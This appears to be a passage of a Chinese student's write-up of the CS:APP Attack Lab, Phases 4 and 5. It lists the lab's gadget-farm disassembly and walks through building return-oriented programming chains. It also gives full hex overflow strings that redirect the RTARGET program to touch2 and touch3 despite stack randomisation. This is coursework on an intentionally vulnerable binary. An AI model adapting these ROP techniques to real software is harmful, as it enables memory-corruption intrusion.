因此，我们可以通过将执行的地址定在`0x400f18`而不是`0x400f15`，来让程序执行命令`movq %rax, %rdi`。

由此，我们的攻击代码将由一系列这样的函数组成，称为**gadget farm**。

- **gadget farm**函数组 （RTARGET文件中）
    
    ```asm
    0000000000401900 <start_farm>:
      401900:	b8 01 00 00 00       	mov    $0x1,%eax
      401905:	c3                   	retq   
    
    0000000000401906 <setval_175>:
      401906:	c7 07 48 89 c7 c2    	movl   $0xc2c78948,(%rdi)
      40190c:	c3                   	retq   
    
    000000000040190d <setval_284>:
      40190d:	c7 07 79 46 78 c3    	movl   $0xc3784679,(%rdi)
      401913:	c3                   	retq   
    
    0000000000401914 <setval_312>:
      401914:	c7 07 d8 c3 cc 3f    	movl   $0x3fccc3d8,(%rdi)
      40191a:	c3                   	retq   
    
    000000000040191b <getval_382>:
      40191b:	b8 48 89 c7 90       	mov    $0x90c78948,%eax
      401920:	c3                   	retq   
    
    0000000000401921 <getval_109>:
      401921:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
      401926:	c3                   	retq   
    
    0000000000401927 <addval_195>:
      401927:	8d 87 48 89 c7 c7    	lea    -0x383876b8(%rdi),%eax
      40192d:	c3                   	retq   
    
    000000000040192e <getval_135>:
      40192e:	b8 58 90 90 c3       	mov    $0xc3909058,%eax
      401933:	c3                   	retq   
    
    0000000000401934 <setval_438>:
      401934:	c7 07 3a 48 89 c7    	movl   $0xc789483a,(%rdi)
      40193a:	c3                   	retq   
    
    000000000040193b <mid_farm>:
      40193b:	b8 01 00 00 00       	mov    $0x1,%eax
      401940:	c3                   	retq   
    
    0000000000401941 <add_xy>:
      401941:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
      401945:	c3                   	retq   
    
    0000000000401946 <getval_327>:
      401946:	b8 81 d6 20 db       	mov    $0xdb20d681,%eax
      40194b:	c3                   	retq   
    
    000000000040194c <setval_127>:
      40194c:	c7 07 89 d6 90 c3    	movl   $0xc390d689,(%rdi)
      401952:	c3                   	retq   
    
    0000000000401953 <getval_156>:
      401953:	b8 89 c1 94 90       	mov    $0x9094c189,%eax
      401958:	c3                   	retq   
    
    0000000000401959 <setval_410>:
      401959:	c7 07 48 89 e0 94    	movl   $0x94e08948,(%rdi)
      40195f:	c3                   	retq   
    
    0000000000401960 <getval_330>:
      401960:	b8 89 c1 84 c0       	mov    $0xc084c189,%eax
      401965:	c3                   	retq   
    
    0000000000401966 <setval_277>:
      401966:	c7 07 af 48 99 e0    	movl   $0xe09948af,(%rdi)
      40196c:	c3                   	retq   
    
    000000000040196d <setval_155>:
      40196d:	c7 07 88 c1 20 db    	movl   $0xdb20c188,(%rdi)
      401973:	c3                   	retq   
    
    0000000000401974 <addval_275>:
      401974:	8d 87 88 ca 38 db    	lea    -0x24c73578(%rdi),%eax
      40197a:	c3                   	retq   
    
    000000000040197b <addval_418>:
      40197b:	8d 87 15 89 ca c2    	lea    -0x3d3576eb(%rdi),%eax
      401981:	c3                   	retq   
    
    0000000000401982 <getval_313>:
      401982:	b8 8b c1 90 c3       	mov    $0xc390c18b,%eax
      401987:	c3                   	retq   
    
    0000000000401988 <getval_427>:
      401988:	b8 89 ca 94 c9       	mov    $0xc994ca89,%eax
      40198d:	c3                   	retq   
    
    000000000040198e <getval_258>:
      40198e:	b8 a9 ca 38 d2       	mov    $0xd238caa9,%eax
      401993:	c3                   	retq   
    
    0000000000401994 <setval_461>:
      401994:	c7 07 89 c1 a4 c0    	movl   $0xc0a4c189,(%rdi)
      40199a:	c3                   	retq   
    
    000000000040199b <addval_154>:
      40199b:	8d 87 48 89 e0 92    	lea    -0x6d1f76b8(%rdi),%eax
      4019a1:	c3                   	retq   
    
    00000000004019a2 <getval_363>:
      4019a2:	b8 eb 92 c9 d6       	mov    $0xd6c992eb,%eax
      4019a7:	c3                   	retq   
    
    00000000004019a8 <addval_293>:
      4019a8:	8d 87 8b c1 20 db    	lea    -0x24df3e75(%rdi),%eax
      4019ae:	c3                   	retq   
    
    00000000004019af <addval_497>:
      4019af:	8d 87 48 89 e0 90    	lea    -0x6f1f76b8(%rdi),%eax
      4019b5:	c3                   	retq   
    
    00000000004019b6 <getval_339>:
      4019b6:	b8 89 ca 84 c0       	mov    $0xc084ca89,%eax
      4019bb:	c3                   	retq   
    
    00000000004019bc <setval_376>:
      4019bc:	c7 07 48 89 e0 c1    	movl   $0xc1e08948,(%rdi)
      4019c2:	c3                   	retq   
    
    00000000004019c3 <addval_477>:
      4019c3:	8d 87 48 89 e0 91    	lea    -0x6e1f76b8(%rdi),%eax
      4019c9:	c3                   	retq   
    
    00000000004019ca <getval_393>:
      4019ca:	b8 89 c1 38 c0       	mov    $0xc038c189,%eax
      4019cf:	c3                   	retq   
    
    00000000004019d0 <getval_360>:
      4019d0:	b8 89 d6 48 db       	mov    $0xdb48d689,%eax
      4019d5:	c3                   	retq   
    
    00000000004019d6 <addval_301>:
      4019d6:	8d 87 81 d6 84 db    	lea    -0x247b297f(%rdi),%eax
      4019dc:	c3                   	retq   
    
    00000000004019dd <setval_119>:
      4019dd:	c7 07 89 d6 28 d2    	movl   $0xd228d689,(%rdi)
      4019e3:	c3                   	retq   
    
    00000000004019e4 <getval_493>:
      4019e4:	b8 48 89 e0 c3       	mov    $0xc3e08948,%eax
      4019e9:	c3                   	retq   
    
    00000000004019ea <addval_139>:
      4019ea:	8d 87 89 d6 60 c9    	lea    -0x369f2977(%rdi),%eax
      4019f0:	c3                   	retq   
    
    00000000004019f1 <setval_408>:
      4019f1:	c7 07 8b ca 90 c3    	movl   $0xc390ca8b,(%rdi)
      4019f7:	c3                   	retq   
    
    00000000004019f8 <setval_181>:
      4019f8:	c7 07 89 d6 84 d2    	movl   $0xd284d689,(%rdi)
      4019fe:	c3                   	retq   
    
    00000000004019ff <addval_222>:
      4019ff:	8d 87 09 ca 20 d2    	lea    -0x2ddf35f7(%rdi),%eax
      401a05:	c3                   	retq   
    
    0000000000401a06 <setval_336>:
      401a06:	c7 07 89 ca c3 2a    	movl   $0x2ac3ca89,(%rdi)
      401a0c:	c3                   	retq   
    
    0000000000401a0d <addval_205>:
      401a0d:	8d 87 a9 c1 08 c0    	lea    -0x3ff73e57(%rdi),%eax
      401a13:	c3                   	retq   
    
    0000000000401a14 <setval_221>:
      401a14:	c7 07 48 89 e0 c2    	movl   $0xc2e08948,(%rdi)
      401a1a:	c3                   	retq   
    
    0000000000401a1b <end_farm>:
      401a1b:	b8 01 00 00 00       	mov    $0x1,%eax
      401a20:	c3                   	retq   
      401a21:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
      401a28:	00 00 00 
      401a2b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
    ```
    

我们的工作是从**gadget farm**中挑选出有用的gadget，执行类似于前述第二关和第三关的攻击。

> 函数`start_farm`和`end_farm`之间的所有函数构成了你的gadget farm。
不要用程序代码中的其他部分作为你的gadget。
> 

同时，给出了一些指令的字节值：

![截屏2023-12-11 11.04.51.png](CSAPP%EF%BD%9CAttack%20Lab/%25E6%2588%25AA%25E5%25B1%258F2023-12-11_11.04.51.png)

### Phase 4 Level 2

#### 任务

重复**Phase 2 Level 2**的攻击——让程序执行`touch2`而不是返回`test`，并使调用`touch2`时参数为我的**cookie**（ungisned类型）——但需要使用**gadget farm**里的**gadget**来攻击**RTARGET**程序。

答案只使用如下指令类型的gadget，也只能使用前八个x86-64寄存器（`%rax`-`%rdi`）。

- movq：代码如前图所示。
- popq：代码如前图所示。
- ret：该指令编码为`0xc3`。
- nop：该指令编码为`0x90`。

> 💡**注意：**
> 
> - 只能用两个**gadget**来实现该次攻击。
> - 如果一个**gadget**使用了`popq`指令，那么它会从栈中弹出数据。这样一来，你的攻击代码能既包含**gadget**的地址也包含数据。

#### 思路

在**Level 2**中，攻击代码为：

```asm
movq $0x2ded9dc0,%rdi   ; 设置参数为cookie的值
pushq $0x4017a4        ; 将touch2的首地址压栈，待ret跳转时使用
ret
```

但在这里，我们显然无法进行立即数的赋值，只能通过字符串攻击将**cookie**存入栈中，然后通过`popq`操作将其弹出并赋值给指定寄存器。

因此，猜测目标攻击代码主体大概为：

```asm
; 假设已经通过Gets函数的输入溢出将cookie写入栈中
popq %rdi          ; 弹出cookie并存入%rdi 5f
ret                ; 弹出touch2的地址，进行返回跳转
```

查询**gadget farm**函数组，发现没有对应于`popq %rdi`的字节值，于是需要找另一个寄存器来当中介。

经过一番查找，发现`%rax`适合当中介——函数组内具有`popq`和`movq`指令对应的字节值、且后面紧跟着`ret`指令：

```asm
000000000040191b <getval_382>:
  40191b:	b8 48 89 c7 90       	mov    $0x90c78948,%eax
  401920:	c3                   	retq

0000000000401921 <getval_109>:
  401921:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  401926:	c3                   	retq
```

> 题目有提示，`0x90`对应的是空指令`nop`，因此可忽略
> 

于是攻击代码为：

```asm
popq %rax         ; 58
ret
;;;;;;;;
movq %rax,%rdi    ; 48 89 c7
ret
```

#### 栈结构

根据**gadget farm**函数组中找到的两个函数，可知攻击代码的地址分别为`0x401923`和`0x40191c`。

`getbuf`函数执行`ret`返回后的栈结构如下：

![Untitled.png](CSAPP%EF%BD%9CAttack%20Lab/Untitled%204.png)

具体而言，`getbuf`函数返回后将跳转`0x401923`执行`popq`命令，于是栈指针`rsp`上移并将**cookie**弹出；之后执行`ret`命令，栈弹出地址`0x40191c`并跳转，执行`movq`命令后`ret`，栈弹出`&(touch2)`，跳转执行函数`touch2`。

> 其实`test`函数的栈桢并没有这么长，在**Phase 3 Level 3** 中我们已经查看过了，它的栈桢只有16字节——8字节的可用空间和8字节的返回地址（其值为`0x401df3`）；
这里只是方便起见，用`test`笼统地称呼高位栈的父函数们，包括最后一个任务，“`test`函数”的栈桢会更长（罪过罪过）。
> 

#### 解决

可得攻击字符串：

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00  // 填充getbuf栈桢前部分
23 19 40 00 00 00 00 00  // popq %rax; ret 
c0 9d ed 2d 00 00 00 00  // cookie
1c 19 40 00 00 00 00 00  // movq %rax,%rdi; ret
a4 17 40 00 00 00 00 00  // 函数touch2首地址
```

执行后完成任务。

![截屏2023-12-11 12.53.00.png](CSAPP%EF%BD%9CAttack%20Lab/%25E6%2588%25AA%25E5%25B1%258F2023-12-11_12.53.00.png)

---

### Phase 5 Level 3

在[CMU实验指导原文PDF](http://csapp.cs.cmu.edu/3e/attacklab.pdf)中，这里放了一段劝退文案：

> *Before you take on the Phase 5, pause to consider what you have accomplished so far. In Phases 2 and 3, you caused a program to execute machine code of your own design. If CTARGET had been a network server, you could have injected your own code into a distant machine. In Phase 4, you circumvented two of the main devices modern systems use to thwart buffer overflow attacks. Although you did not inject your own code, you were able inject a type of program that operates by stitching together sequences of existing code. You have also gotten 95/100 points for the lab. That’s a good score. If you have other pressing obligations consider stopping right now.
Phase 5 requires you to do an ROP attack on RTARGET to invoke function touch3 with a pointer to a string representation of your cookie. That may not seem significantly more difficult than using an ROP attack to invoke touch2, except that we have made it so. Moreover, Phase 5 counts for only 5 points, which is not a true measure of the effort it will require. Think of it as more an extra credit problem for those who want to go beyond the normal expectations for the course.*
> 

我不管我就是要做

#### 任务

对**RTARGET**程序进行**ROP**攻击，重复**Phase 3 Level 3**的效果——使程序调用`touch3`函数，且参数为指向**cookie**字符串的指针，

这一关，允许你使用函数start_farm和end_farm之间的所有gadget。

除了第四阶段允许的那些指令，还允许使用`movl`指令，以及D中的2字节指令（如前图所示），它们可以作为有功能的nop，不改变任何寄存器或内存的值。（例如，`andb %al, %al`，这些指令对寄存器的低位字节做操作，但是不改变它们的值）

💡**提示：**

- 官方答案需要8个gadgets。

#### 思路

**Phase 3 Level 3** 中的攻击代码为：

```asm
movq $0x55654948,%rdi  ; 设置参数为cookie字符串的首地址
pushq $0x401878        ; 压栈touch3的首地址
ret                    ; 返回，跳转touch3
```

但由于**RTARGET**程序的栈是随机化的，无法直接指定存入栈中的**cookie**字符串的地址，只能通过栈指针`rsp`加上一个偏移量来访问

因此，我们必然使用到`lea`命令，但题目并未给出`lea`命令的字节值，查阅**gadget farm**函数组，发现有一个现成的gadget可以用：

```asm
0000000000401941 <add_xy>:
  401941:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  401945:	c3                   	retq
```

此外，也可以发现`movq %rsp,xxx`在**gadget farm**函数组中存在的字节值：（最终确定目标寄存器为`%rax`）

```asm
00000000004019af <addval_497>:
  4019af:	8d 87 48 89 e0 90    	lea    -0x6f1f76b8(%rdi),%eax
  4019b5:	c3                   	retq
```

而用于访问**cookie**的偏移量也需要存入栈中，通过`pop`弹出使用，于是目标攻击代码主体大概为：

```asm
movq %rsp,%rax   ; 获取栈指针
movq %rax,%rdi   ; 
popq %rsi        ; 弹出偏移量
lea (%rdi,%rsi,1),%rax  ; 计算cookie首地址
movq %rax,%rdi   ; 
ret              ; 跳转执行touch3
```

查阅**gadget farm**函数组，发现攻击代码竟然可以全部实现、不用拐弯抹角，那就开心进行吧。

#### 栈结构1

> 需要注意，偏移量的确定需要考虑执行`movq %rsp,%rax`命令时的栈指针地址。（其为`0x55654948`）
> 

`getbuf`函数执行`ret`返回后的栈结构如下：

![Untitled](CSAPP%EF%BD%9CAttack%20Lab/Untitled%205.png)

#### 解决1

攻击字符串如下：

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
b1 19 40 00 00 00 00 00  // movq %rsp,%rax; ret
1c 19 40 00 00 00 00 00  // movq %rax,%rdi; ret
f2 21 40 00 00 00 00 00  // popq %rsi; ret
30 00 00 00 00 00 00 00  // 偏移量
41 19 40 00 00 00 00 00  // lea (%rdi,%rsi,1),%rax; ret
1c 19 40 00 00 00 00 00  // movq %rax, %rdi; ret
78 18 40 00 00 00 00 00  // &(touch3)
32 64 65 64 39 64 63 30 // cookie的ASCII码字节值（小端）
00                      // 字符串末尾要更上一个`\0`字符
```

执行，任务完成。（才怪）

![截屏2023-12-11 20.08.22.png](CSAPP%EF%BD%9CAttack%20Lab/%25E6%2588%25AA%25E5%25B1%258F2023-12-11_20.08.22.png)

#### 粗心咯！

但是！打开Scoreboard发现成绩被标注”Invalid”，看来必须要使用整整**8**个**gadget**才行。

![截屏2023-12-11 20.09.08.png](CSAPP%EF%BD%9CAttack%20Lab/%25E6%2588%25AA%25E5%25B1%258F2023-12-11_20.09.08.png)

另外在检查的时候发现，地址`0x4021f2`对应的函数`<rio_read>`并不属于**gadget farm**，实际上**gadget farm**中只含一个弹栈指令——`popq %rax`。（决定单开一个文件来检索，省的搜到其他地方白高兴了😭）

查阅**gadget farm**函数组（省略尝试过程），巧用`movl`指令，将攻击代码变为：

```asm
;地址0x4019b1 <addval_497>
movq %rsp,%rax  ; 获取栈指针 48 89 e0
ret
;地址0x40191c <getval_382>
movq %rax,%rdi  ; 48 89 c7
ret
~~;;地址0x4021f2 <rio_read>
;popq %rsi       ; 弹出偏移量 5e
;ret~~
;地址0x401923 <getval_109>
popq %rax       ; 弹出偏移量 58
ret
;地址0x4019cb <getval_393>
movl %eax,%ecx  ; 89 c1             eax,edx 89 c2
ret
;地址0x4019b7 <getval_339>
movl %ecx,%edx  ; 89 ca             edx,ecx 98 d1
ret
;地址0x40194e <setval_127>, 0x401a00 <setval_181>
movl %edx,%esi  ; 89 d6             ecx,esi 89 ce; 
ret

;地址0x401941 <add_xy>
lea (%rdi,%rsi,1),%rax ; 计算cookie首地址 
ret
;地址0x401937 <setval_438>
movq %rax,%rdi ; 参数指定为cookie首地址 48 89 c7
ret
```

#### 栈结构2

`getbuf`函数执行`ret`返回后的栈结构如下：

![Untitled.png](CSAPP%EF%BD%9CAttack%20Lab/Untitled%206.png)

#### 解决2

于是攻击字符串为：

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
b1 19 40 00 00 00 00 00  // movq %rsp,%rax; ret
1c 19 40 00 00 00 00 00  // movq %rax,%rdi; ret
23 19 40 00 00 00 00 00  // popq %rax; ret
48 00 00 00 00 00 00 00  // 偏移量
cb 19 40 00 00 00 00 00  // movl %eax,%ecx; ret
b7 19 40 00 00 00 00 00  // movl %ecx,%edx; ret
4e 19 40 00 00 00 00 00  // movl %edx,%esi; ret
41 19 40 00 00 00 00 00  // lea (%rdi,%rsi,1),%rax; ret
37 19 40 00 00 00 00 00  // movq %rax,%rdi; ret
78 18 40 00 00 00 00 00  // &(touch3)
32 64 65 64 39 64 63 30  // cookie的ASCII码字节值（小端）
00                       // 字符串末尾要跟上一个`\0`字符
```

执行，任务完成。

![截屏2023-12-11 21.01.40.png](CSAPP%EF%BD%9CAttack%20Lab/%25E6%2588%25AA%25E5%25B1%258F2023-12-11_21.01.40.png)

![截屏2023-12-11 21.02.22.png](CSAPP%EF%BD%9CAttack%20Lab/%25E6%2588%25AA%25E5%25B1%258F2023-12-11_21.02.22.png)
